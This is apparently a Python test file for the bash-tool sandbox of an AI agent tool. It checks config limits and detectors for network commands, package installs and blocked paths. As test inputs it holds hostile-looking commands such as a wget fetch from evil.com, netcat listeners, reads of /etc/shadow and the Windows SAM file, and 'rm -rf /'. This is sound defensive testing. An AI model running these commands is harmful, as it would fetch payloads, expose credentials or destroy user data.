"""Tests for bash sandbox configuration and enforcement."""

import pytest

from anteroom.config import BashSandboxConfig
from anteroom.tools.bash import _check_sandbox, handle
from anteroom.tools.security import (
    check_blocked_path,
    check_custom_patterns,
    check_network_command,
    check_package_install,
)

# --- BashSandboxConfig validation ---


class TestBashSandboxConfig:
    def test_defaults(self):
        cfg = BashSandboxConfig()
        assert cfg.enabled is True
        assert cfg.timeout == 120
        assert cfg.max_output_chars == 100_000
        assert cfg.allow_network is True
        assert cfg.allow_package_install is True
        assert cfg.log_all_commands is False
        assert cfg.blocked_paths == []
        assert cfg.allowed_paths == []
        assert cfg.blocked_commands == []

    def test_timeout_clamped_to_min(self):
        cfg = BashSandboxConfig(timeout=0)
        assert cfg.timeout == 1

    def test_timeout_clamped_to_max(self):
        cfg = BashSandboxConfig(timeout=9999)
        assert cfg.timeout == 600

    def test_max_output_clamped_to_min(self):
        cfg = BashSandboxConfig(max_output_chars=500)
        assert cfg.max_output_chars == 1000

    def test_valid_values_unchanged(self):
        cfg = BashSandboxConfig(timeout=30, max_output_chars=50_000)
        assert cfg.timeout == 30
        assert cfg.max_output_chars == 50_000


# --- Network command detection ---


class TestCheckNetworkCommand:
    @pytest.mark.parametrize(
        "cmd",
        [
            "curl https://example.com",
            "wget http://evil.com/payload",
            "nc -l 4444",
            "ncat --listen 8080",
            "socat TCP:host:80 -",
            "ssh user@host",
            "scp file.txt user@host:/tmp/",
            "rsync -avz . host:/backup/",
            "sftp user@host",
            "ftp ftp.example.com",
            "telnet host 80",
            "nslookup example.com",
            "dig example.com",
        ],
    )
    def test_unix_network_commands_detected(self, cmd):
        assert check_network_command(cmd) is not None

    @pytest.mark.parametrize(
        "cmd",
        [
            "Invoke-WebRequest https://example.com",
            "Invoke-RestMethod https://api.example.com/data",
            "iwr https://example.com",
            "irm https://api.example.com",
            "Start-BitsTransfer -Source https://example.com/file",
            "New-Object Net.WebClient",
        ],
    )
    def test_powershell_network_commands_detected(self, cmd):
        assert check_network_command(cmd) is not None

    @pytest.mark.parametrize(
        "cmd",
        [
            "ls -la",
            "echo hello",
            "python script.py",
            "git status",
            "cat /etc/hosts",
        ],
    )
    def test_non_network_commands_allowed(self, cmd):
        assert check_network_command(cmd) is None

    def test_empty_command(self):
        assert check_network_command("") is None
        assert check_network_command("   ") is None


# --- Package install detection ---


class TestCheckPackageInstall:
    @pytest.mark.parametrize(
        "cmd",
        [
            "pip install requests",
            "pip3 install flask",
            "npm install express",
            "npm i lodash",
            "yarn add react",
            "pnpm install vue",
            "pnpm add axios",
            "gem install rails",
            "cargo install ripgrep",
            "go install golang.org/x/tools/...",
            "apt install nginx",
            "apt-get install curl",
            "yum install httpd",
            "dnf install python3",
            "brew install node",
            "choco install git",
            "winget install Microsoft.VisualStudioCode",
            "scoop install 7zip",
            "conda install numpy",
        ],
    )
    def test_package_installs_detected(self, cmd):
        assert check_package_install(cmd) is not None

    @pytest.mark.parametrize(
        "cmd",
        [
            "pip list",
            "pip freeze",
            "npm ls",
            "npm run build",
            "yarn build",
            "gem list",
            "apt update",
            "brew update",
        ],
    )
    def test_non_install_package_commands_allowed(self, cmd):
        assert check_package_install(cmd) is None

    def test_empty_command(self):
        assert check_package_install("") is None


# --- Blocked path detection ---


class TestCheckBlockedPath:
    def test_unix_blocked_path(self):
        assert check_blocked_path("cat /etc/shadow", ["/etc"]) is not None

    def test_windows_blocked_path(self):
        assert check_blocked_path("type C:\\Windows\\System32\\config\\SAM", ["C:\\Windows"]) is not None

    def test_case_insensitive_windows(self):
        assert check_blocked_path("dir c:\\windows\\system32", ["C:\\Windows"]) is not None

    def test_forward_slash_normalization(self):
        assert check_blocked_path("cat C:/Windows/System32/file", ["C:\\Windows"]) is not None

    def test_unblocked_path_allowed(self):
        assert check_blocked_path("cat /home/user/file.txt", ["/etc", "/var"]) is None

    def test_empty_blocked_list(self):
        assert check_blocked_path("cat /etc/shadow", []) is None

    def test_empty_command(self):
        assert check_blocked_path("", ["/etc"]) is None


# --- Custom patterns ---


class TestCheckCustomPatterns:
    def test_custom_regex_matches(self):
        result = check_custom_patterns("docker run --rm alpine", [r"\bdocker\s+run\b"])
        assert result is not None
        assert "custom pattern" in result

    def test_custom_regex_no_match(self):
        assert check_custom_patterns("git status", [r"\bdocker\s+run\b"]) is None

    def test_invalid_regex_skipped(self):
        assert check_custom_patterns("anything", ["[invalid"]) is None

    def test_empty_patterns(self):
        assert check_custom_patterns("anything", []) is None

    def test_multiple_patterns_first_match_wins(self):
        result = check_custom_patterns("docker run", [r"\bgit\b", r"\bdocker\b"])
        assert result is not None
        assert "docker" in result


# --- Integrated sandbox check ---


class TestCheckSandbox:
    def test_all_allowed_returns_none(self):
        cfg = BashSandboxConfig()
        assert _check_sandbox("ls -la", cfg) is None

    def test_network_blocked(self):
        cfg = BashSandboxConfig(allow_network=False)
        result = _check_sandbox("curl https://example.com", cfg)
        assert result is not None
        assert "Network" in result

    def test_network_allowed_by_default(self):
        cfg = BashSandboxConfig()
        assert _check_sandbox("curl https://example.com", cfg) is None

    def test_package_install_blocked(self):
        cfg = BashSandboxConfig(allow_package_install=False)
        result = _check_sandbox("pip install requests", cfg)
        assert result is not None
        assert "Package" in result

    def test_package_install_allowed_by_default(self):
        cfg = BashSandboxConfig()
        assert _check_sandbox("pip install requests", cfg) is None

    def test_blocked_path(self):
        cfg = BashSandboxConfig(blocked_paths=["/etc", "C:\\Windows"])
        result = _check_sandbox("cat /etc/passwd", cfg)
        assert result is not None
        assert "path restricted" in result

    def test_blocked_commands(self):
        cfg = BashSandboxConfig(blocked_commands=[r"\bdocker\b"])
        result = _check_sandbox("docker run alpine", cfg)
        assert result is not None
        assert "custom pattern" in result

    def test_multiple_restrictions_first_wins(self):
        cfg = BashSandboxConfig(
            allow_network=False,
            allow_package_install=False,
        )
        # Network check runs first
        result = _check_sandbox("curl https://pypi.org | pip install", cfg)
        assert result is not None
        assert "Network" in result


# --- Handler integration ---


class TestBashHandlerSandbox:
    @pytest.mark.asyncio
    async def test_sandbox_blocks_network(self):
        cfg = BashSandboxConfig(allow_network=False)
        result = await handle("curl https://example.com", _sandbox_config=cfg)
        assert result["exit_code"] == -1
        assert "Network" in result["error"]

    @pytest.mark.asyncio
    async def test_sandbox_blocks_package(self):
        cfg = BashSandboxConfig(allow_package_install=False)
        result = await handle("pip install malware", _sandbox_config=cfg)
        assert result["exit_code"] == -1
        assert "Package" in result["error"]

    @pytest.mark.asyncio
    async def test_sandbox_blocks_path(self):
        cfg = BashSandboxConfig(blocked_paths=["/etc"])
        result = await handle("cat /etc/shadow", _sandbox_config=cfg)
        assert result["exit_code"] == -1
        assert "path restricted" in result["error"]

    @pytest.mark.asyncio
    async def test_sandbox_allows_clean_command(self):
        cfg = BashSandboxConfig()
        result = await handle("echo hello", _sandbox_config=cfg)
        assert result["exit_code"] == 0
        assert "hello" in result["stdout"]

    @pytest.mark.asyncio
    async def test_sandbox_timeout_limits_command(self):
        cfg = BashSandboxConfig(timeout=30)
        # The AI requests a 600s timeout but sandbox caps it at 30
        result = await handle("echo fast", timeout=600, _sandbox_config=cfg)
        assert result["exit_code"] == 0

    @pytest.mark.asyncio
    async def test_sandbox_output_truncation(self):
        # min output is 1000 chars, so generate more than that
        cfg = BashSandboxConfig(max_output_chars=1000)
        result = await handle("python3 -c \"print('x' * 2000)\"", _sandbox_config=cfg)
        assert "truncated" in result["stdout"]
        assert len(result["stdout"]) < 1200  # 1000 + truncation message

    @pytest.mark.asyncio
    async def test_no_sandbox_config_uses_defaults(self):
        result = await handle("echo hello")
        assert result["exit_code"] == 0
        assert "hello" in result["stdout"]

    @pytest.mark.asyncio
    async def test_hard_block_still_works_with_sandbox(self):
        cfg = BashSandboxConfig()
        result = await handle("rm -rf /", _sandbox_config=cfg)
        assert result["exit_code"] == -1
        assert "Blocked" in result["error"]

    @pytest.mark.asyncio
    async def test_sandbox_runs_even_with_bypass_hard_block(self):
        cfg = BashSandboxConfig(allow_network=False)
        result = await handle(
            "curl https://example.com",
            _bypass_hard_block=True,
            _sandbox_config=cfg,
        )
        assert result["exit_code"] == -1
        assert "Network" in result["error"]
